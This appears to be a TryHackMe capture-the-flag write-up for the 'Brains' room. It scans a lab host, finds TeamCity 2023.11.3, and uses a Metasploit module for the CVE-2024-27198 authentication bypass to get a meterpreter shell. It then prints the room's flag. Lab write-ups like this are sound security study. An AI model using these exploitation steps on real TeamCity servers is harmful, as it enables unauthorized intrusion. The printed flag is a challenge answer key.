# TryHackMe - Brains
- [Challenge Information](#challenge-information)
- [Solution](#solution)

## Challenge Information
<a name="challenge-information"></a>

```text
Level: Easy
Author: tryhackme
        Dex01
        strategos
        l000g1c
Description: The city forgot to close its gate.
```

## Solution
<a name="solution"></a>

- [Task 1: Red: Exploit the server!](#t1)


### Task 1: Red: Exploit the server!
<a name="t1"></a>

#### Enumeration
Using `nmap` to gather information of the target
```
$ nmap -T4 -p- -v 10.10.217.11
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-29 08:04 BST
Initiating ARP Ping Scan at 08:04
Scanning 10.10.217.11 [1 port]
Completed ARP Ping Scan at 08:04, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:04
Completed Parallel DNS resolution of 1 host. at 08:04, 0.00s elapsed
Initiating SYN Stealth Scan at 08:04
Scanning 10.10.217.11 [65535 ports]
Discovered open port 80/tcp on 10.10.217.11
Discovered open port 22/tcp on 10.10.217.11
Discovered open port 50000/tcp on 10.10.217.11
Completed SYN Stealth Scan at 08:04, 4.24s elapsed (65535 total ports)
Nmap scan report for 10.10.217.11
Host is up (0.0043s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
50000/tcp open  ibm-db2
MAC Address: 02:D7:0D:01:3E:7D (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.58 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

## Open ports:
- **22**  (SSH)
- **80** (HTTP)
- **50000** (ibm-db2)

## Port 80
Visiting the website `http://{your_target}/` (In this case, my target's ip is `10.10.217.11`, so the link address will be `http://10.10.217.11`)

<img width="753" alt="Image" src="https://github.com/user-attachments/assets/bde7d255-435b-4011-9ae4-49cd3878210a" />

As I can see this only display the word `Maintenance` which has nothing special. Also, I had a look at the page source of this website but nothing new. 

<img width="753" alt="Image" src="https://github.com/user-attachments/assets/c759c9b9-c82b-4994-a154-a072907bcf23" />

Therefore, I moved to the next port (Port 50000)
## Port 500000
Attempting to access `http://10.10.217.11:50000`, it is a login page of TeamCity. As far as I can tell, the version is 2023.11.3 (build 147512)

<img width="753" alt="Image" src="https://github.com/user-attachments/assets/020280cb-0f35-438b-b12c-e58008b352a2" />

At first, I had no idea what is going on and kept in my mind that I need to exploit the server, so I did some online research about TeamCity Version 2023.11.3 and ended up with [this note](https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199), which details an authentication vulnerability in TeamCity due to URL parsing. It also explains how this can be exploited for remote code execution (RCE) by using the vulnerability to interact with the API, allowing the creation of an admin account that can then be used to upload a malicious plugin.

Thus, I looked for the [exploit](https://github.com/W01fh4cker/CVE-2024-27198-RCE) automating the aforementioned steps.

For someone who are scrip kiddie like me, there is steps by steps process as shown below:

1. Activating `metasploit` by typing `msfcosole`
   
2. Search `teamcity` and note that the exploit suffix code is `27198`. Then, I `use 4` to get the desired exploit.
   
   <img width="753" alt="Image" src="https://github.com/user-attachments/assets/ba9c20a9-e00c-49b7-86e7-224c0e7939ca" />
   
3. Type `options` to know what parameters are needed to be filled in
   
   <img width="753" alt="Image" src="https://github.com/user-attachments/assets/9ee59478-0295-4892-8efa-acb066f85bcf" />
   
4. There are 2 parameters RHOSTS and RPORT, so I just type `set rhosts {your_target_ip}` then `set rport 50000`
   
   
6. Type `run`
   

```
meterpreter > getuid
Server username: ubuntu
meterpreter > shell
Process 1 created.
Channel 1 created.
script /dev/null -c bash {//TYPE MANUALLY//}
ubuntu@brains:/opt/teamcity/TeamCity/bin$ cd
cd
ubuntu@brains:~$ ls
config.log    flag.txt
ubuntu@brains:~$ cat flag.txt
THM{faa9bac345709b6620a6200b484c7594}
```
# DONE!!!! :partying_face:

